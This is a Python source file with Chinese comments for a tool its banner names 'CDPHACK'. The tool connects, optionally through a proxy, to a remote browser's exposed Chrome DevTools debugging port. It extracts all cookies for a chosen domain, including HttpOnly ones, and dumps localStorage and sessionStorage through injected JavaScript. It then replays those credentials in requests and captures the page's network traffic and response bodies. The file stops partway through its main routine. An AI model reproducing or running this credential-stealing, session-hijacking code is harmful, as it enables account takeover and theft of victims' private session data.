import asyncio
import json
import websockets
import aiohttp
import traceback
from urllib.parse import urlparse, urlunparse, parse_qs, unquote
from typing import List, Dict, Optional, Tuple, Any
from aiohttp_socks import ProxyType, ProxyConnector
import socks  # 需安装: pip install PySocks
from websockets.client import connect as ws_connect

# -------------------------- 新增：ANSI颜色常量（无需额外库） --------------------------
class Colors:
    # 文本颜色
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    PURPLE = "\033[95m"
    CYAN = "\033[96m"
    # 样式
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    # 重置（必须加，否则后续文本会继承颜色）
    RESET = "\033[0m"

    # 快捷方法：彩色打印
    @staticmethod
    def print_success(msg: str):
        print(f"{Colors.GREEN}[SUCCESS]{Colors.RESET} {msg}")

    @staticmethod
    def print_error(msg: str):
        print(f"{Colors.RED}[ERROR]{Colors.RESET} {msg}")

    @staticmethod
    def print_warn(msg: str):
        print(f"{Colors.YELLOW}[WARN]{Colors.RESET} {msg}")

    @staticmethod
    def print_info(msg: str):
        print(f"{Colors.BLUE}[INFO]{Colors.RESET} {msg}")

    @staticmethod
    def print_title(msg: str):
        """改进的标题打印方法，支持多行文本并使每行居中"""
        line_length = 60
        print(f"\n{Colors.BOLD}{Colors.PURPLE}{'='*line_length}{Colors.RESET}")
        # 按换行符拆分文本
        lines = msg.split('\n')
        for line in lines:
            print(f"{Colors.BOLD}{Colors.CYAN}{line.center(line_length)}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.PURPLE}{'='*line_length}{Colors.RESET}")


class CDPProxyRequester:
    def __init__(self):
        self.cdp_base_url = ""
        self.proxy_config = None
        self.page_ws: Optional[Any] = None
        self.command_id = 1
        self.connected = False
        self.current_origin = ""
        self.main_frame_id = ""
        self.command_responses: Dict[int, Dict] = {}
        self.event_listener_task: Optional[asyncio.Task] = None
        self.network_requests: List[Dict] = []  # 存储所有捕获的请求
        self.network_listener_task: Optional[asyncio.Task] = None  # 网络监听任务
        self.command_timeout = 30  # 命令超时时间
        self.response_retry_count = 2  # 响应内容获取重试次数
        self.reconnect_attempts = 2  # 连接断开时重连次数
        self.page_ws_url: Optional[str] = None
        self.start_network_listener: bool = False

    # 新增：连接状态检查
    def is_connected(self) -> bool:
        """检查当前连接状态是否有效"""
        return self.connected and self.page_ws is not None and not self.page_ws.closed

    # 新增：尝试重连机制
    async def _reconnect(self) -> bool:
        """当连接断开时尝试重新连接"""
        if not self.page_ws_url:
            Colors.print_error("无页面连接信息，无法重连")
            return False

        print(f"\n{Colors.YELLOW}[重连] 检测到连接断开，尝试重新连接（最多{self.reconnect_attempts}次）...{Colors.RESET}")

        for attempt in range(self.reconnect_attempts):
            try:
                # 关闭旧连接
                if self.page_ws:
                    try:
                        await self.page_ws.close()
                    except:
                        pass

                # 重置状态
                self.command_responses.clear()
                self.event_listener_task = None

                # 重新连接
                print(f"{Colors.BLUE}[重连] 第{attempt+1}次尝试连接...{Colors.RESET}")
                self.page_ws = await self._create_proxied_ws_connection(self.page_ws_url)
                self.connected = True

                # 重启事件监听
                self.event_listener_task = asyncio.create_task(self._listen_events())
                Colors.print_success("WebSocket重新连接成功")

                # 重新启用必要的CDP域
                required_domains = ["Network.enable", "Runtime.enable", "Page.enable"]
                if self.start_network_listener:
                    required_domains.append("DOM.enable")

                for domain in required_domains:
                    await self._send_cdp_command(domain)

                Colors.print_success("所有CDP域已重新启用")
                return True

            except Exception as e:
                Colors.print_error(f"第{attempt+1}次尝试失败: {str(e)}")
                if attempt < self.reconnect_attempts - 1:
                    await asyncio.sleep(2)  # 等待2秒后重试

        Colors.print_error("所有重连尝试失败")
        self.connected = False
        self.page_ws = None
        return False

    # -------------------------- 基础配置方法 --------------------------
    def _init_proxy(self) -> None:
        Colors.print_title("代理配置（支持SOCKS5/HTTP）")

        while True:
            proxy_type = input(f"\n{Colors.CYAN}1. 代理类型（socks5/http/无(n)）: {Colors.RESET}").strip().lower()
            if proxy_type in ["socks5", "http", "n"]:
                break
            Colors.print_error("输入错误，请输入socks5、http或无(n)")

        if proxy_type == "n":
            self.proxy_config = None
            Colors.print_success("未启用代理")
            return

        while True:
            proxy_addr = input(f"{Colors.CYAN}2. {proxy_type.upper()}代理地址（如127.0.0.1:1080）: {Colors.RESET}").strip()
            if ":" in proxy_addr:
                proxy_host, proxy_port_str = proxy_addr.split(":", 1)
                try:
                    proxy_port = int(proxy_port_str)
                    break
                except ValueError:
                    Colors.print_error("端口必须是数字")
            Colors.print_error("格式错误，正确格式：IP:端口")

        use_auth = input(f"{Colors.CYAN}3. 代理是否需要账号密码？(y/n): {Colors.RESET}").strip().lower()
        proxy_user = ""
        proxy_pass = ""
        if use_auth == "y":
            proxy_user = input(f"{Colors.CYAN}   账号: {Colors.RESET}").strip()
            proxy_pass = input(f"{Colors.CYAN}   密码: {Colors.RESET}").strip()

        self.proxy_config = {
            "type": proxy_type,
            "host": proxy_host,
            "port": proxy_port,
            "username": proxy_user if proxy_user else None,
            "password": proxy_pass if proxy_pass else None
        }
        Colors.print_success(f"已配置{proxy_type.upper()}代理：{proxy_host}:{proxy_port}（{'带认证' if proxy_user else '无认证'}）")

    def _init_remote_cdp(self) -> None:
        Colors.print_title("远程CDP配置")
        print(f"{Colors.BLUE}提示：目标电脑需启动浏览器并开放CDP端口（如--remote-debugging-port=9222）{Colors.RESET}")
        print(f"{Colors.BLUE}示例：http://192.168.1.100:9222（远程电脑IP+CDP端口）{Colors.RESET}")

        while True:
            cdp_url = input(f"\n{Colors.CYAN}输入远程CDP服务地址: {Colors.RESET}").strip()
            if cdp_url.startswith(("http://", "https://")):
                parsed = urlparse(cdp_url)
                if parsed.scheme == "https":
                    Colors.print_warn("CDP协议默认不支持HTTPS，自动转为HTTP")
                    cdp_url = urlunparse(("http", parsed.netloc, parsed.path, "", "", ""))
                self.cdp_base_url = cdp_url
                break
            Colors.print_error("格式错误，请输入http://开头的地址（如http://192.168.1.100:9222）")
        Colors.print_success(f"已配置远程CDP地址：{self.cdp_base_url}")

    # -------------------------- WebSocket/HTTP连接方法 --------------------------
    async def _create_aiohttp_connector(self) -> Optional[aiohttp.TCPConnector]:
        if not self.proxy_config:
            return None

        proxy_type = self.proxy_config["type"]
        proxy_host = self.proxy_config["host"]
        proxy_port = self.proxy_config["port"]
        proxy_user = self.proxy_config["username"]
        proxy_pass = self.proxy_config["password"]

        if proxy_type == "socks5":
            connector = ProxyConnector(
                proxy_type=ProxyType.SOCKS5,
                host=proxy_host,
                port=proxy_port,
                username=proxy_user,
                password=proxy_pass,
                ssl=False
            )
        else:
            connector = ProxyConnector(
                proxy_type=ProxyType.HTTP,
                host=proxy_host,
                port=proxy_port,
                username=proxy_user,
                password=proxy_pass,
                ssl=False
            )
        return connector

    async def _create_proxied_ws_connection(self, ws_url: str) -> Any:
        if not self.proxy_config:
            try:
                return await ws_connect(ws_url, ssl=None, timeout=15, ping_interval=30, ping_timeout=10)
            except Exception as e:
                raise ConnectionError(f"无代理WebSocket连接失败: {str(e)}")

        parsed_ws = urlparse(ws_url)
        if parsed_ws.scheme != "ws":
            raise ConnectionError("CDP调试接口必须是ws://协议")

        proxy_cfg = self.proxy_config
        try:
            sock = socks.socksocket()
            sock_type = socks.SOCKS5 if proxy_cfg["type"] == "socks5" else socks.HTTP
            sock.set_proxy(
                sock_type,
                proxy_cfg["host"],
                proxy_cfg["port"],
                username=proxy_cfg["username"],
                password=proxy_cfg["password"]
            )
            sock.connect((parsed_ws.hostname, parsed_ws.port or 80))
            sock.settimeout(15)

            return await ws_connect(
                ws_url,
                sock=sock,
                ssl=None,
                timeout=15,
                ping_interval=30,  # 增加WebSocket心跳检测
                ping_timeout=10
            )
        except Exception as e:
            raise ConnectionError(f"代理WebSocket连接失败: {str(e)}")

    # -------------------------- CDP命令/事件处理 --------------------------
    async def _listen_events(self):
        """改进的事件监听器，增加错误处理和连接保持"""
        try:
            while self.is_connected():
                try:
                    # 使用超时接收，避免无限阻塞
                    message = await asyncio.wait_for(self.page_ws.recv(), timeout=30)
                    data = json.loads(message)

                    # 区分事件和命令响应
                    if "method" in data and "id" not in data:
                        self._handle_cdp_event(data)
                    else:
                        if "id" in data:
                            self.command_responses[data["id"]] = data

                except asyncio.TimeoutError:
                    # 超时但连接仍有效，发送ping保持连接
                    if self.is_connected():
                        try:
                            await self.page_ws.ping()
                        except:
                            pass
                    continue
                except websockets.exceptions.ConnectionClosed:
                    Colors.print_info("WebSocket连接已关闭")
                    break
                except Exception as e:
                    if self.is_connected():
                        Colors.print_error(f"处理消息错误: {str(e)}")
                    continue

            # 连接断开时更新状态
            self.connected = False
        except asyncio.CancelledError:
            Colors.print_info("事件监听任务已正常终止")
        except Exception as e:
            Colors.print_error(f"事件监听任务异常终止: {str(e)}")
        finally:
            self.connected = False

    def _handle_cdp_event(self, event: Dict):
        """处理CDP事件，重点捕获网络请求"""
        method = event["method"]
        params = event.get("params", {})

        # 1. 网络请求发送事件
        if method == "Network.requestWillBeSent":
            request = params.get("request", {})
            req_type = params.get("type", "").upper()

            # 排除非关键资源类型，只捕获业务相关请求
            excluded_types = ["IMAGE", "FONT", "STYLESHEET", "MEDIA", "WEBSOCKET"]
            if req_type in excluded_types:
                return

            # 解析请求参数（URL参数+Body参数）
            parsed_url = urlparse(request.get("url", ""))
            url_params = parse_qs(parsed_url.query) if parsed_url.query else {}
            req_body = request.get("postData", "")
            body_params = {}
            if req_body:
                try:
                    body_params = json.loads(req_body)  # JSON格式
                except:
                    body_params = parse_qs(req_body)  # 表单格式

            # 存储请求基础信息
            request_info = {
                "id": len(self.network_requests) + 1,  # 全局序号
                "requestId": params.get("requestId", ""),  # CDP请求ID
                "url": request.get("url", ""),
                "method": request.get("method", "").upper(),
                "type": req_type,
                "requestHeaders": request.get("headers", {}),
                "requestParams": {"url_params": url_params, "body_params": body_params},
                "statusCode": None,
                "responseHeaders": {},
                "responseContent": None,
                "complete": False
            }
            self.network_requests.append(request_info)
            print(f"{Colors.GREEN}[捕获请求]{Colors.RESET} {req_type} | {request.get('method')} | {request.get('url')[:60]}...")

        # 2. 网络响应接收事件
        elif method == "Network.responseReceived":
            request_id = params.get("requestId")
            if not request_id:
                return

            # 找到对应的请求
            for req in self.network_requests:
                if req["requestId"] == request_id and not req["complete"]:
                    response = params.get("response", {})
                    req["statusCode"] = response.get("status", None)
                    req["responseHeaders"] = response.get("headers", {})
                    req["complete"] = True
                    print(f"{Colors.CYAN}[请求完成]{Colors.RESET} {req['method']} {req['statusCode']} | {req['url'][:60]}...")
                    break

        # 3. 其他关键事件（仅打印日志）
        elif method in ["Runtime.executionContextCreated"]:
            print(f"{Colors.BLUE}[CDP事件]{Colors.RESET} {method}（预览：{json.dumps(event, ensure_ascii=False)[:80]}...）")

    async def _send_cdp_command(self, method: str, params: Optional[Dict] = None, timeout: Optional[int] = None) -> Dict:
        """发送CDP命令，增加连接检查和自动重连"""
        # 检查连接状态，如已断开尝试重连
        if not self.is_connected():
            print(f"{Colors.YELLOW}[CDP命令] 连接已断开，尝试重连后发送 {method} 命令...{Colors.RESET}")
            if not await self._reconnect():
                raise ConnectionError("未连接到调试页面，且重连失败")

        command_id = self.command_id
        self.command_id += 1
        command = {"id": command_id, "method": method, "params": params or {}}

        try:
            await self.page_ws.send(json.dumps(command))
            start_time = asyncio.get_event_loop().time()
            current_timeout = timeout or self.command_timeout

            while True:
                # 检查是否超时
                if asyncio.get_event_loop().time() - start_time > current_timeout:
                    raise TimeoutError(f"CDP命令超时（{method}，ID：{command_id}，超时{current_timeout}秒）")

                # 检查连接是否仍然有效
                if not self.is_connected():
                    if not await self._reconnect():
                        raise ConnectionError("命令执行过程中连接断开，重连失败")
                    # 重连后需要重新发送命令
                    await self.page_ws.send(json.dumps(command))
                    start_time = asyncio.get_event_loop().time()  # 重置超时计时

                # 检查是否收到响应
                if command_id in self.command_responses:
                    resp_data = self.command_responses.pop(command_id)
                    if "error" in resp_data:
                        raise RuntimeError(f"命令失败: {resp_data['error']['message']}（错误码：{resp_data['error'].get('code', '未知')}）")
                    return resp_data

                await asyncio.sleep(0.1)
        except Exception as e:
            self.connected = False
            raise ConnectionError(f"CDP通信失败（{method}）: {str(e)}")

    # -------------------------- 获取网络请求响应内容 --------------------------
    async def _get_request_response_content(self, request_id: str) -> str:
        """通过CDP命令获取请求的完整响应内容，优化错误处理"""
        last_error = ""
        for attempt in range(self.response_retry_count + 1):
            try:
                # 确保连接有效
                if not self.is_connected():
                    print(f"{Colors.YELLOW}连接已断开，尝试重新连接...{Colors.RESET}")
                    if not await self._reconnect():
                        return "获取响应内容失败: 连接已断开且无法重连"

                resp = await self._send_cdp_command(
                    "Network.getResponseBody",
                    {"requestId": request_id},
                    timeout=45
                )
                body = resp["result"].get("body", "")
                # 处理Base64编码的响应
                if resp["result"].get("base64Encoded", False):
                    import base64
                    body = base64.b64decode(body).decode("utf-8", errors="ignore")
                return body
            except Exception as e:
                last_error = str(e)
                if attempt < self.response_retry_count:
                    print(f"{Colors.YELLOW}[重试] 获取响应内容失败（第{attempt+1}次），{last_error}，2秒后重试...{Colors.RESET}")
                    await asyncio.sleep(2)  # 延长重试间隔
        return f"获取响应内容失败（已重试{self.response_retry_count}次）: {last_error}"

    # -------------------------- 凭证提取方法 --------------------------
    async def _get_main_frame_id(self) -> str:
        try:
            frame_resp = await self._send_cdp_command("Page.getFrameTree")
            frame_tree = frame_resp["result"].get("frameTree")
            if not frame_tree:
                raise RuntimeError("响应无'frameTree'字段")
            main_frame = frame_tree.get("frame")
            if not main_frame:
                raise RuntimeError("响应无'frame'字段")
            main_frame_id = main_frame.get("id")
            if not main_frame_id:
                raise RuntimeError("主帧无'id'字段")
            return main_frame_id
        except Exception as e:
            raise ConnectionError(f"获取主帧ID失败: {str(e)}")

    async def _extract_storage_by_js(self, storage_type: str) -> Dict:
        if not self.is_connected():
            if not await self._reconnect():
                raise ConnectionError("未就绪：无法提取存储数据，且重连失败")

        js_code = f"""
            (() => {{
                const data = {{}};
                try {{
                    const s = window.{storage_type};
                    for (let i=0; i<s.length; i++) {{
                        const k = s.key(i);
                        data[k] = s.getItem(k);
                    }}
                }} catch (e) {{}}
                return data;
            }})();
        """

        try:
            eval_resp = await self._send_cdp_command(
                "Runtime.evaluate",
                {"expression": js_code, "returnByValue": True, "awaitPromise": True}
            )
            result = eval_resp["result"].get("result", {})
            return result.get("value", {}) if result.get("type") == "object" else {}
        except Exception as e:
            Colors.print_warn(f"{storage_type}提取失败: {str(e)}")
            return {}

    async def extract_credentials(self, target_domain: str) -> Tuple[List[Dict], Dict, Dict]:
        if not self.is_connected():
            if not await self._reconnect():
                raise ConnectionError("未连接页面，且重连失败")

        # 1. 提取Cookie
        cookies = []
        try:
            cookie_resp = await self._send_cdp_command("Network.getAllCookies")
            all_cookies = cookie_resp["result"].get("cookies", [])
            cookies = [c for c in all_cookies if target_domain in c.get("domain", "")]
            for c in cookies:
                c["total_length"] = len(f"{c.get('name', '')}={c.get('value', '')}")
        except Exception as e:
            Colors.print_warn(f"Cookie提取失败: {str(e)}")

        # 2. 提取存储数据
        await asyncio.sleep(2)
        local_storage = await self._extract_storage_by_js("localStorage")
        session_storage = await self._extract_storage_by_js("sessionStorage")

        return cookies, local_storage, session_storage

    # -------------------------- 完整凭证打印方法 --------------------------
    def _print_full_credentials(self, cookies: List[Dict], local_storage: Dict, session_storage: Dict, target_domain: str):
        """打印完整的Cookie、localStorage、sessionStorage内容"""
        Colors.print_title(f"[{target_domain}] 完整凭证信息")

        # 1. 完整Cookie
        print(f"\n{Colors.BOLD}{Colors.CYAN}【1】完整Cookie列表:{Colors.RESET}")
        if not cookies:
            print(f"   {Colors.RED}❌ 无Cookie数据{Colors.RESET}")
        else:
            for idx, c in enumerate(cookies, 1):
                print(f"\n   第{idx}条Cookie:")
                print(f"   - {Colors.BLUE}名称{Colors.RESET}: {c.get('name', '未知')}")
                print(f"   - {Colors.BLUE}值{Colors.RESET}: {c.get('value', '未知')}")
                print(f"   - {Colors.BLUE}域名{Colors.RESET}: {c.get('domain', '未知')}")
                print(f"   - {Colors.BLUE}路径{Colors.RESET}: {c.get('path', '未知')}")
                print(f"   - {Colors.BLUE}过期时间{Colors.RESET}: {c.get('expires', '会话期')}")
                print(f"   - {Colors.BLUE}HttpOnly{Colors.RESET}: {c.get('httpOnly', False)}")
                print(f"   - {Colors.BLUE}Secure{Colors.RESET}: {c.get('secure', False)}")
                print("   " + "-"*80)

        # 2. 完整localStorage
        print(f"\n{Colors.BOLD}{Colors.CYAN}【2】完整localStorage:{Colors.RESET}")
        if not local_storage:
            print(f"   {Colors.RED}❌ 无localStorage数据{Colors.RESET}")
        else:
            for idx, (key, value) in enumerate(local_storage.items(), 1):
                print(f"\n   第{idx}条键值对:")
                print(f"   - {Colors.BLUE}键名{Colors.RESET}: {key}")
                print(f"   - {Colors.BLUE}完整值{Colors.RESET}: {value}")
                print("   " + "-"*80)

        # 3. 完整sessionStorage
        print(f"\n{Colors.BOLD}{Colors.CYAN}【3】完整sessionStorage:{Colors.RESET}")
        if not session_storage:
            print(f"   {Colors.RED}❌ 无sessionStorage数据{Colors.RESET}")
        else:
            for idx, (key, value) in enumerate(session_storage.items(), 1):
                print(f"\n   第{idx}条键值对:")
                print(f"   - {Colors.BLUE}键名{Colors.RESET}: {key}")
                print(f"   - {Colors.BLUE}完整值{Colors.RESET}: {value}")
                print("   " + "-"*80)
        print("\n" + "="*100)

    # -------------------------- 连接页面方法 --------------------------
    async def connect_to_page(self, page_ws_url: str, page_origin: str, start_network_listener: bool = False) -> None:
        # 保存连接信息用于重连
        self.page_ws_url = page_ws_url
        self.start_network_listener = start_network_listener

        self.connected = False
        self.current_origin = page_origin
        self.main_frame_id = ""
        self.command_responses.clear()
        self.network_requests.clear()

        # 关闭旧连接和任务
        if self.page_ws:
            try:
                await self.page_ws.close()
            except:
                pass
        if self.event_listener_task and not self.event_listener_task.done():
            self.event_listener_task.cancel()
            try:
                await self.event_listener_task
            except:
                pass

        try:
            Colors.print_info("正在建立WebSocket连接...")
            self.page_ws = await self._create_proxied_ws_connection(page_ws_url)

            self.connected = True
            # 启动基础事件监听（含网络事件捕获）
            self.event_listener_task = asyncio.create_task(self._listen_events())
            Colors.print_success("WebSocket连接成功，事件监听任务已启动")

            # 启用核心CDP域
            required_domains = ["Network.enable", "Runtime.enable", "Page.enable"]
            if start_network_listener:
                required_domains.append("DOM.enable")

            # 执行CDP命令启用域
            for domain in required_domains:
                await self._send_cdp_command(domain)

            # 若为凭证提取（操作a），需获取主帧ID
            if not start_network_listener:
                self.main_frame_id = await self._get_main_frame_id()

        except Exception as e:
            self.connected = False
            if self.page_ws:
                try:
                    await self.page_ws.close()
                except:
                    pass
            self.page_ws = None
            if self.event_listener_task and not self.event_listener_task.done():
                self.event_listener_task.cancel()
            raise ConnectionError(f"页面连接失败: {str(e)}")

    # -------------------------- 网络请求列表分页与详情显示 --------------------------
    def _paginate_requests(self, page: int, page_size: int = 5) -> Tuple[List[Dict], int, int]:
        """分页处理网络请求列表，默认每页5条"""
        total = len(self.network_requests)
        total_pages = (total + page_size - 1) // page_size  # 向上取整
        if page < 1:
            page = 1
        if page > total_pages:
            page = total_pages
        # 计算当前页请求
        start_idx = (page - 1) * page_size
        end_idx = start_idx + page_size
        current_page_requests = self.network_requests[start_idx:end_idx]
        return current_page_requests, page, total_pages

    async def _print_request_details(self, request: Dict):
        """打印单个请求的详情，支持响应内容按需加载"""
        Colors.print_title(f"请求详情 - 序号：{request['id']}（类型：{request['type']}）")
        print(f"1. {Colors.BLUE}请求URL{Colors.RESET}：{request['url']}")
        print(f"2. {Colors.BLUE}请求方法{Colors.RESET}：{request['method']}")
        print(f"3. {Colors.BLUE}响应状态码{Colors.RESET}：{request['statusCode'] or '未知'}")

        # 4. 请求头
        print(f"\n4. {Colors.BLUE}请求头{Colors.RESET}：")
        for k, v in request["requestHeaders"].items():
            print(f"   {k:<25}: {v}")

        # 5. 请求参数
        print(f"\n5. {Colors.BLUE}请求参数{Colors.RESET}：")
        url_params = request["requestParams"]["url_params"]
        body_params = request["requestParams"]["body_params"]
        if url_params:
            print("   URL参数（GET）：")
            for k, v in url_params.items():
                print(f"     {k}: {v[0] if isinstance(v, list) and len(v)==1 else v}")
        if body_params:
            print("   体参数（POST/PUT等）：")
            if isinstance(body_params, dict):
                print(f"     {json.dumps(body_params, indent=4, ensure_ascii=False)}")
            else:
                print(f"     {body_params}")
        if not url_params and not body_params:
            print("   无请求参数")

        # 6. 响应头
        print(f"\n6. {Colors.BLUE}响应头{Colors.RESET}：")
        for k, v in request["responseHeaders"].items():
            print(f"   {k:<25}: {v}")

        # 7. 响应内容（按需加载）
        print(f"\n7. {Colors.BLUE}响应内容{Colors.RESET}：")
        # 先获取响应内容（若未获取过）
        if not request["responseContent"]:
            # 检查连接状态
            if not self.is_connected():
                print("   连接已断开，尝试重新连接...")
                if not await self._reconnect():
                    print("   无法重新连接到页面，无法获取响应内容")
                    request["responseContent"] = "获取响应内容失败: 连接已断开且无法重连"
                else:
                    print(f"   正在加载响应内容（最多重试{self.response_retry_count}次）...")
                    request["responseContent"] = await self._get_request_response_content(request["requestId"])
            else:
                print(f"   正在加载响应内容（最多重试{self.response_retry_count}次）...")
                request["responseContent"] = await self._get_request_response_content(request["requestId"])

        content = request["responseContent"] or "无响应内容"
        content_len = len(content)
        if content_len > 2000:
            # 询问是否加载全部
            while True:
                confirm = input(f"   内容过长（共{content_len}字符），是否加载全部？(y/n): ").strip().lower()
                if confirm in ["y", "n"]:
                    break
                Colors.print_error("输入错误，请输入 'y' 或 'n'")
            if confirm == "y":
                print(f"\n{content}")
            else:
                print(f"\n   显示前2000字符：\n{content[:2000]}...")
        else:
            print(f"\n{content}")
        print("="*100)

    async def handle_network_requests(self):
        """处理网络请求交互（分页查看、详情查看）"""
        if not self.network_requests:
            Colors.print_error("未捕获到任何网络请求")
            print(f"{Colors.BLUE}💡 提示：请确保在远程页面上有实际的请求操作（如刷新页面、点击按钮等）{Colors.RESET}")
            return

        total_requests = len(self.network_requests)
        print(f"\n{Colors.GREEN}[统计]{Colors.RESET} 共收集到 {total_requests} 条已完成请求（总捕获：{total_requests}）")
        current_page = 1
        page_size = 5
        total_pages = (total_requests + page_size - 1) // page_size

        while True:
            # 分页获取当前页请求
            current_requests, current_page, total_pages = self._paginate_requests(current_page, page_size)

            # 打印当前页列表
            print(f"\n{Colors.BOLD}{Colors.PURPLE}[网络请求列表 - 第{current_page}/{total_pages}页]{Colors.RESET}")
            print("-"*100)
            print(f"{Colors.CYAN}{'序号':<6} {'方法':<8} {'类型':<10} {'URL（前80字符）'}{Colors.RESET}")
            print("-"*100)
            for req in current_requests:
                url_short = req['url'][:80] + "..." if len(req['url']) > 80 else req['url']
                print(f"{req['id']:<6} {req['method']:<8} {req['type']:<10} {url_short}")
            print("-"*100)

            # 操作提示
            print(f"{Colors.BLUE}操作选项：{Colors.RESET}")
            print(f"  - 输入请求序号（1-{total_requests}）查看详情")
            print(f"  - 输入 'p' 上一页 | 'n' 下一页 | 'q' 退出")
            action = input(f"{Colors.CYAN}请输入操作: {Colors.RESET}").strip().lower()

            # 处理操作
            if action == "q":
                Colors.print_success("退出网络请求查看")
                break
            elif action == "p":
                current_page -= 1
                if current_page < 1:
                    Colors.print_warn("已为第一页，无法上翻")
                    current_page = 1
            elif action == "n":
                current_page += 1
                if current_page > total_pages:
                    Colors.print_warn("已为最后一页，无法下翻")
                    current_page = total_pages
            elif action.isdigit():
                req_idx = int(action)
                # 找到对应序号的请求
                target_req = next((r for r in self.network_requests if r["id"] == req_idx), None)
                if target_req:
                    print(f"\n正在加载序号{req_idx}的请求详情...")
                    await self._print_request_details(target_req)
                else:
                    Colors.print_error(f"未找到序号为{req_idx}的请求")
            else:
                Colors.print_error("操作无效，请重新输入")

    # -------------------------- 其他方法（请求发送、页面获取、断开连接） --------------------------
    async def send_request(self, target_url: str, selected_cookies: Dict, selected_local: Dict, selected_session: Dict) -> Dict:
        cookie_str = "; ".join([f"{k}={v}" for k, v in selected_cookies.items()])
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0",
            "Cookie": cookie_str,
            "Origin": self.current_origin,
            "Referer": f"{self.current_origin}/"
        }

        params = {}
        if selected_local or selected_session:
            params["storage_data"] = json.dumps({"local": selected_local, "session": selected_session})

        connector = await self._create_aiohttp_connector()
        try:
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.get(
                    target_url, headers=headers, params=params, ssl=None, timeout=30,
                    allow_redirects=True
                ) as resp:
                    response_bytes = await resp.read()
                    charset = resp.charset or 'utf-8'
                    try:
                        response_text = response_bytes.decode(charset, errors='replace')
                    except UnicodeDecodeError:
                        response_text = response_bytes.decode('utf-8', errors='ignore')

                    return {
                        "status_code": resp.status,
                        "final_url": str(resp.url),
                        "content": response_text,
                        "content_length": len(response_text),
                        "raw_length": len(response_bytes)
                    }
        except aiohttp.ClientError as e:
            raise ConnectionError(f"请求失败: {str(e)}")
        finally:
            if connector and not connector.closed:
                await connector.close()

    async def get_debuggable_pages(self) -> List[Dict]:
        connector = await self._create_aiohttp_connector()
        try:
            async with aiohttp.ClientSession(connector=connector) as session:
                try:
                    cdp_json_url = f"{self.cdp_base_url}/json"
                    async with session.get(cdp_json_url, timeout=15) as resp:
                        if resp.status != 200:
                            raise ConnectionError(f"获取页面列表失败，状态码: {resp.status}（请检查远程CDP是否启动）")
                        pages = await resp.json()
                except aiohttp.ClientError as e:
                    raise ConnectionError(f"CDP服务连接失败: {str(e)}（请检查代理和远程地址）")
        finally:
            if connector and not connector.closed:
                await connector.close()

        valid_pages = []
        for page in pages:
            if not page.get("webSocketDebuggerUrl"):
                continue

            page_info = {
                "title": page.get("title", "无标题页面"),
                "url": page.get("url", "未知URL"),
                "webSocketDebuggerUrl": page["webSocketDebuggerUrl"],
                "origin": "未知",
                "domain": "未知"
            }

            if page_info["url"]:
                try:
                    parsed = urlparse(page_info["url"])
                    page_info["origin"] = f"{parsed.scheme}://{parsed.netloc}"
                    page_info["domain"] = parsed.netloc or "未知"
                except Exception:
                    page_info["origin"] = "URL解析失败"
                    page_info["domain"] = "URL解析失败"

            valid_pages.append(page_info)

        return valid_pages

    async def disconnect(self) -> None:
        self.connected = False
        # 停止网络监听任务
        if self.network_listener_task and not self.network_listener_task.done():
            self.network_listener_task.cancel()
            try:
                await self.network_listener_task
            except:
                pass
        # 停止基础事件监听任务
        if self.event_listener_task and not self.event_listener_task.done():
            self.event_listener_task.cancel()
            try:
                await self.event_listener_task
            except:
                pass
        # 关闭WebSocket连接
        if self.page_ws:
            try:
                await self.page_ws.close()
            except:
                pass
        self.page_ws = None
        self.command_responses.clear()
        self.network_requests.clear()
        # 清除连接信息
        self.page_ws_url = None
        self.start_network_listener = False


async def main():
    # 新增：彩色Logo和标题
    print(f"""{Colors.BOLD}{Colors.PURPLE}
  ████  ████    ████    ██  ██    ██      ████  ██  ██
 ██     ██  ██  ██  ██  ██  ██   ████    ██     ██ ██
██      ██  ██  ████    ██████  ██████  ██      ████
██   █  ██  ██  ██      ██  ██  ██  ██  ██   █  ██ ██
  ████  ████    ██      ██  ██  ██  ██    ████  ██  ██
{Colors.RESET}""")
    # 修改后的标题，确保两行都居中
    Colors.print_title("CDPHACK（一款基于cdp协议劫持浏览器内容的工具）\nby 菠萝吹雪 aka 羊博士")
    print(f"{Colors.CYAN}功能：\n 1.获取凭证信息\n 2.复用凭证信息请求\n 3.劫持网络选项卡请求{Colors.RESET}\n")
    cdp_requester = CDPProxyRequester()

    try:
        # 步骤1：配置代理和CDP
        cdp_requester._init_proxy()
        cdp_requester._init_remote_cdp()

        # 步骤2：获取页面列表
        print(f"\n{Colors.BLUE}[3/6] 加载远程CDP的可调试页面...{Colors.RESET}")
        pages = await cdp_requester.get_debuggable_pages()
        if not pages:
            Colors.print_error("未找到可用调试页面")
            return

        # 显示页面
        print(f"\n{Colors.BOLD}{Colors.CYAN}远程CDP可用页面:{Colors.RESET}")
        valid_page_indices = []
        for idx, page in enumerate(pages, 1):
            if page["domain"] not in ["未知", "URL解析失败", "devtools", "chrome-extension"]:
                valid_page_indices.append(idx-1)
                print(f"{len(valid_page_indices)}. {Colors.GREEN}标题{Colors.RESET}: {page['title']} | {Colors.BLUE}域名{Colors.RESET}: {page['domain']}")
                print(f"   URL: {page['url'][:60]}...")

        if not valid_page_indices:
            Colors.print_error("未找到正常的网站页面")
            return

        # 步骤3：选择目标页面
        print(f"\n{Colors.BLUE}[4/6] 选择目标页面{Colors.RESET}")
        while True:
            try:
                choice = int(input(f"{Colors.CYAN}输入页面编号 (1-{len(valid_page_indices)}): {Colors.RESET}")) - 1
                if 0 <= choice < len(valid_page_indices):
                    real_page_idx = valid_page_indices[choice]
                    target_page = pages[real_page_idx]
                    break
                Colors.print_error(f"请输入1-{len(valid_page_indices)}")
            except ValueError:
                Colors.print_error("请输入数字")

        # 步骤4：选择操作类型
        print(f"\n{Colors.BLUE}[5/6] 选择操作类型{Colors.RESET}")
        while True:
            action = input(f"{Colors.CYAN}请选择操作 (a:获取凭证信息 / b:获取网络选项卡请求): {Colors.RESET}").strip().lower()
            if action in ["a", "b"]:
                break
            Colors.print_error("输入错误，请输入 'a' 或 'b'")

        # 步骤5：根据操作类型执行逻辑
        if action == "a":
            # 操作a：获取凭证信息
            print(f"\n{Colors.BLUE}[6/6] 连接页面：{target_page['title']}（{target_page['domain']}）...{Colors.RESET}")
            await cdp_requester.connect_to_page(
